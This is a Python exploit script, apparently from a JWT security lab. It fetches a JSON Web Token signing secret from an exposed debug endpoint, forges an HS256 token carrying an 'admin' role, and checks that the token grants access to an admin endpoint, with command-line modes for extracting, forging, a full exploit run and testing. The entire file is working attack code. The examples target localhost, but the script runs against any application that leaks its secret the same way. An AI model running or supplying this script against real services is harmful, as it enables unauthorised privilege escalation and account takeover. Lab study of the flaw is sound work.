#!/usr/bin/env python3
"""
JWT Lab - Secret Leak Exploit

This script demonstrates retrieving the JWT secret from a debug endpoint
and using it to forge tokens with elevated privileges.
"""

import jwt
import json
import sys
import time
import requests

def fetch_secret_from_debug(debug_url):
    """Fetch the JWT secret from the debug endpoint."""
    try:
        print(f"[*] Accessing debug endpoint: {debug_url}")
        response = requests.get(debug_url)
        
        if response.status_code == 200:
            data = response.json()
            print(f"[+] Debug endpoint response status: {response.status_code}")
            
            # Try to extract the secret based on our knowledge of the server structure
            if 'config' in data and 'jwtSecret' in data['config']:
                secret = data['config']['jwtSecret']
                print(f"[+] Successfully extracted JWT secret: {secret}")
                return secret
            
            # Output the entire response for manual inspection
            print("\n[*] Debug endpoint response:")
            print(json.dumps(data, indent=2))
            
            # Ask user to input the secret if it wasn't found automatically
            secret = input("\n[?] Could not automatically extract JWT secret. Please enter it manually: ")
            return secret
        else:
            print(f"[-] Failed to access debug endpoint: {response.status_code}")
            return None
    except Exception as e:
        print(f"[-] Error fetching secret: {e}")
        return None

def forge_admin_token(secret, username="user"):
    """Forge an admin token using the leaked secret."""
    payload = {
        "userId": "1234567890",
        "username": username,
        "role": "admin",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600  # 1 hour from now
    }
    
    token = jwt.encode(payload, secret, algorithm="HS256")
    return token

def verify_admin_access(admin_url, token):
    """Verify admin access with the forged token."""
    try:
        print(f"[*] Testing admin access at: {admin_url}")
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get(admin_url, headers=headers)
        
        print(f"[+] Response status code: {response.status_code}")
        print(f"[+] Response body: {response.text}")
        
        if response.status_code == 200:
            print("[+] Admin access granted! Exploit successful.")
            return True
        else:
            print("[-] Admin access denied. Exploit failed.")
            return False
    except Exception as e:
        print(f"[-] Error testing admin access: {e}")
        return False

def print_usage():
    print("Usage:")
    print("  1. Find and extract JWT secret:")
    print("     python secret_leak.py extract <debug_endpoint_url>")
    print("     Example: python secret_leak.py extract http://localhost:3000/api/debug")
    print()
    print("  2. Forge a token with a known secret:")
    print("     python secret_leak.py forge <secret> [username]")
    print("     Example: python secret_leak.py forge supersecretkey john")
    print()
    print("  3. Full exploit (extract, forge, and test admin access):")
    print("     python secret_leak.py exploit <base_url>")
    print("     Example: python secret_leak.py exploit http://localhost:3000")
    print()
    print("  4. Test admin access with an existing token:")
    print("     python secret_leak.py test <admin_url> <token>")
    print("     Example: python secret_leak.py test http://localhost:3000/api/admin eyJhbG...")

def main():
    if len(sys.argv) < 2 or sys.argv[1] in ["-h", "--help"]:
        print_usage()
        sys.exit(1)
    
    action = sys.argv[1]
    
    if action == "extract":
        if len(sys.argv) < 3:
            print("[-] Please provide the debug endpoint URL.")
            print("    Example: python secret_leak.py extract http://localhost:3000/api/debug")
            sys.exit(1)
        
        debug_url = sys.argv[2]
        secret = fetch_secret_from_debug(debug_url)
        
        if secret:
            print(f"[+] Extracted JWT secret: {secret}")
    
    elif action == "forge":
        if len(sys.argv) < 3:
            print("[-] Please provide the JWT secret.")
            print("    Example: python secret_leak.py forge supersecretkey [username]")
            sys.exit(1)
        
        secret = sys.argv[2]
        username = sys.argv[3] if len(sys.argv) > 3 else "user"
        
        token = forge_admin_token(secret, username)
        print(f"[+] Forged admin token: {token}")
        print("[*] Use this token to access admin endpoints.")
    
    elif action == "exploit":
        if len(sys.argv) < 3:
            print("[-] Please provide the base URL.")
            print("    Example: python secret_leak.py exploit http://localhost:3000")
            sys.exit(1)
        
        base_url = sys.argv[2]
        debug_url = f"{base_url}/api/debug"
        admin_url = f"{base_url}/api/admin"
        
        print("\n=== Phase 1: Secret Extraction ===")
        secret = fetch_secret_from_debug(debug_url)
        
        if secret:
            print("\n=== Phase 2: Admin Token Forgery ===")
            token = forge_admin_token(secret)
            print(f"[+] Forged admin token: {token}")
            
            print("\n=== Phase 3: Access Verification ===")
            verify_admin_access(admin_url, token)
        else:
            print("[-] Failed to extract JWT secret. Exploit aborted.")
    
    elif action == "test":
        if len(sys.argv) < 4:
            print("[-] Please provide an admin URL and token to test.")
            print("    Example: python secret_leak.py test http://localhost:3000/api/admin eyJhbG...")
            sys.exit(1)
        
        admin_url = sys.argv[2]
        token = sys.argv[3]
        
        verify_admin_access(admin_url, token)
    
    else:
        print(f"[-] Unknown action: {action}")
        print_usage()
        sys.exit(1)

if __name__ == "__main__":
    main() 